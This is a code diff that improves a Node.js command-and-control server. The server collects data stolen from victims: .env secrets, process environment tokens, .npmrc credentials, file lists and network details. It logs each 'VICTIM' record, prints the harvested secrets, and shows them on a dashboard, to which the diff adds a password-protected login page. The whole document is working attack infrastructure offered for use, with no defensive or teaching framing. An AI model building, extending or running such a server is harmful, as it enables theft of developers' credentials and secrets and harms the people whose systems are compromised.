@@ -1,4 +1,5 @@
 const http = require('http');
+const crypto = require('crypto');
 const fs = require('fs');
 const path = require('path');
 
@@ -9,12 +10,13 @@ const LOG = path.join(__dirname, 'stolen-data.log');
 
 const R = '\x1b[31m', G = '\x1b[32m', Y = '\x1b[33m', C = '\x1b[36m', B = '\x1b[1m', D = '\x1b[2m', X = '\x1b[0m';
 
+const sessions = new Set();
 let victims = [];
 
 console.log(`\n${R}${B}  ╔═══════════════════════════════════════════════╗`);
 console.log(`  ║       C2 SERVER — LISTENING ON PORT ${PORT}        ║`);
 console.log(`  ╚═══════════════════════════════════════════════╝${X}\n`);
-console.log(`${G}  [+] Dashboard login:${X} admin / ${DASH_PASS}`);
+console.log(`${G}  [+] Dashboard password:${X} ${DASH_PASS}`);
 if (C2_SECRET) {
   console.log(`${G}  [+] Payload auth ENABLED${X} — only matching X-Token can POST`);
 } else {
@@ -24,49 +26,67 @@ console.log(`${D}  Dashboard: http://localhost:${PORT}${X}`);
 console.log(`${D}  Reset:     POST /reset (clears all victims)${X}`);
 console.log(`${D}  Waiting for victims...${X}\n`);
 
-http.createServer((req, res) => {
+function parseCookies(req) {
+  const obj = {};
+  (req.headers.cookie || '').split(';').forEach(c => {
+    const [k, ...v] = c.trim().split('=');
+    if (k) obj[k] = v.join('=');
+  });
+  return obj;
+}
+
+function isAuthed(req) {
+  return sessions.has(parseCookies(req).c2sess || '');
+}
+
+function readBody(req) {
+  return new Promise(resolve => {
+    let body = '';
+    req.on('data', c => { if (body.length < 1e6) body += c; });
+    req.on('end', () => resolve(body));
+  });
+}
+
+http.createServer(async (req, res) => {
   if (req.method === 'POST' && (req.url === '/e' || req.url === '/exfil')) {
     if (C2_SECRET && req.headers['x-token'] !== C2_SECRET) {
       res.writeHead(403).end('forbidden');
       return;
     }
-    let body = '';
-    req.on('data', c => { if (body.length < 1e6) body += c; });
-    req.on('end', () => {
-      let d;
-      try { d = JSON.parse(body); } catch { d = { raw: body }; }
-      const v = {
-        id: victims.length + 1,
-        time: d.t || new Date().toISOString(),
-        system: d.s || {},
-        env_files: d.env_files || [],
-        env_tokens: d.env_tokens || {},
-        proc_tokens: d.proc_tokens || {},
-        files: d.f || [],
-        npmrc: d.nr || null,
-        network: d.net || [],
-      };
-      victims.push(v);
-      fs.appendFileSync(LOG, `\n--- VICTIM #${v.id} [${v.time}] ---\n${JSON.stringify(v, null, 2)}\n`);
+    const body = await readBody(req);
+    let d;
+    try { d = JSON.parse(body); } catch { d = { raw: body }; }
+    const v = {
+      id: victims.length + 1,
+      time: d.t || new Date().toISOString(),
+      system: d.s || {},
+      env_files: d.env_files || [],
+      env_tokens: d.env_tokens || {},
+      proc_tokens: d.proc_tokens || {},
+      files: d.f || [],
+      npmrc: d.nr || null,
+      network: d.net || [],
+    };
+    victims.push(v);
+    fs.appendFileSync(LOG, `\n--- VICTIM #${v.id} [${v.time}] ---\n${JSON.stringify(v, null, 2)}\n`);
 
-      console.log(`${R}${B}  [!] VICTIM #${v.id}${X} — ${v.system.h || '?'}@${v.system.u || '?'}`);
-      if (v.env_files.length) {
-        v.env_files.forEach(ef => {
-          console.log(`  ${Y}[.ENV FILE]${X} ${ef.file}`);
-          Object.entries(ef.vars).forEach(([k, val]) =>
-            console.log(`    ${R}${k}${X} = ${G}${val.substring(0, 30)}${val.length > 30 ? '...' : ''}${X}`)
-          );
-        });
-      }
-      const pt = Object.keys(v.proc_tokens);
-      if (pt.length) {
-        console.log(`  ${Y}[process.env]${X}`);
-        pt.forEach(k => console.log(`    ${R}${k}${X} = ${G}${v.proc_tokens[k].substring(0, 30)}...${X}`));
-      }
-      if (v.files.length) console.log(`  ${C}[FILES]${X} ${v.files.join(', ')}`);
-      console.log('');
-      res.writeHead(200).end('ok');
-    });
+    console.log(`${R}${B}  [!] VICTIM #${v.id}${X} — ${v.system.h || '?'}@${v.system.u || '?'}`);
+    if (v.env_files.length) {
+      v.env_files.forEach(ef => {
+        console.log(`  ${Y}[.ENV FILE]${X} ${ef.file}`);
+        Object.entries(ef.vars).forEach(([k, val]) =>
+          console.log(`    ${R}${k}${X} = ${G}${val.substring(0, 30)}${val.length > 30 ? '...' : ''}${X}`)
+        );
+      });
+    }
+    const pt = Object.keys(v.proc_tokens);
+    if (pt.length) {
+      console.log(`  ${Y}[process.env]${X}`);
+      pt.forEach(k => console.log(`    ${R}${k}${X} = ${G}${v.proc_tokens[k].substring(0, 30)}...${X}`));
+    }
+    if (v.files.length) console.log(`  ${C}[FILES]${X} ${v.files.join(', ')}`);
+    console.log('');
+    res.writeHead(200).end('ok');
     return;
   }
 
@@ -79,14 +99,30 @@ http.createServer((req, res) => {
     return;
   }
 
+  if (req.method === 'POST' && req.url === '/login') {
+    const body = await readBody(req);
+    const params = new URLSearchParams(body);
+    if (params.get('password') === DASH_PASS) {
+      const token = crypto.randomBytes(24).toString('hex');
+      sessions.add(token);
+      res.writeHead(302, { 'Set-Cookie': `c2sess=${token}; Path=/; HttpOnly; SameSite=Strict`, 'Location': '/' }).end();
+    } else {
+      res.writeHead(302, { 'Location': '/?err=1' }).end();
+    }
+    return;
+  }
+
   if (req.url === '/api/victims') {
-    if (!checkDashAuth(req)) { res.writeHead(401, { 'WWW-Authenticate': 'Basic realm="C2"' }).end('Unauthorized'); return; }
+    if (!isAuthed(req)) { res.writeHead(401).end('Unauthorized'); return; }
     res.writeHead(200, { 'Content-Type': 'application/json', 'Access-Control-Allow-Origin': '*' }).end(JSON.stringify(victims));
     return;
   }
 
-  if (req.url === '/' && req.method === 'GET') {
-    if (!checkDashAuth(req)) { res.writeHead(401, { 'WWW-Authenticate': 'Basic realm="C2"' }).end('Unauthorized'); return; }
+  if ((req.url === '/' || req.url === '/?err=1') && req.method === 'GET') {
+    if (!isAuthed(req)) {
+      res.writeHead(200, { 'Content-Type': 'text/html' }).end(loginPage(req.url.includes('err=1')));
+      return;
+    }
     res.writeHead(200, { 'Content-Type': 'text/html' }).end(dashboard());
     return;
   }
@@ -94,11 +130,30 @@ http.createServer((req, res) => {
   res.writeHead(404).end();
 }).listen(PORT, '0.0.0.0');
 
-function checkDashAuth(req) {
-  const auth = req.headers.authorization;
-  if (!auth || !auth.startsWith('Basic ')) return false;
-  const decoded = Buffer.from(auth.slice(6), 'base64').toString();
-  return decoded === 'admin:' + DASH_PASS;
+function loginPage(err) {
+  return `<!DOCTYPE html><html><head>
+<meta charset="UTF-8"><meta name="viewport" content="width=device-width,initial-scale=1">
+<title>C2 — Access</title>
+<style>
+*{margin:0;padding:0;box-sizing:border-box}
+body{font-family:'JetBrains Mono','Fira Code',monospace;background:#080808;color:#ccc;min-height:100vh;display:flex;align-items:center;justify-content:center}
+.login{background:#0d0d0d;border:1px solid #f8514933;border-radius:12px;padding:2.5rem;width:340px;animation:si .4s}
+@keyframes si{from{opacity:0;transform:translateY(16px)}to{opacity:1;transform:translateY(0)}}
+.login h1{color:#f85149;font-size:1rem;text-align:center;margin-bottom:.4rem;display:flex;align-items:center;justify-content:center;gap:8px}
+.login .sub{color:#444;font-size:.7rem;text-align:center;margin-bottom:1.5rem}
+.login input{width:100%;background:#111;border:1px solid #222;color:#ccc;padding:10px 14px;border-radius:6px;font-family:inherit;font-size:.85rem;outline:none;transition:border .2s}
+.login input:focus{border-color:#f85149}
+.login button{width:100%;margin-top:1rem;padding:10px;background:#f85149;color:#fff;border:none;border-radius:6px;font-family:inherit;font-size:.85rem;font-weight:700;cursor:pointer;transition:background .2s}
+.login button:hover{background:#da3633}
+.err{color:#f85149;font-size:.72rem;text-align:center;margin-top:.8rem}
+</style></head><body>
+<form class="login" method="POST" action="/login">
+<h1>&#x1f480; C2 Access</h1>
+<div class="sub">Enter password to continue</div>
+<input type="password" name="password" placeholder="Password" autofocus required>
+<button type="submit">Unlock</button>
+${err ? '<div class="err">Wrong password</div>' : ''}
+</form></body></html>`;
 }
 
 function dashboard() {
@@ -155,6 +210,7 @@ function esc(s){if(!s)return'-';var d=document.createElement('div');d.textConten
 let seen=0;
 setInterval(async()=>{
   const r=await fetch('/api/victims');
+  if(r.status===401){location.reload();return;}
   const vs=await r.json();
   if(vs.length<=seen)return;
   for(let i=seen;i<vs.length;i++) render(vs[i]);
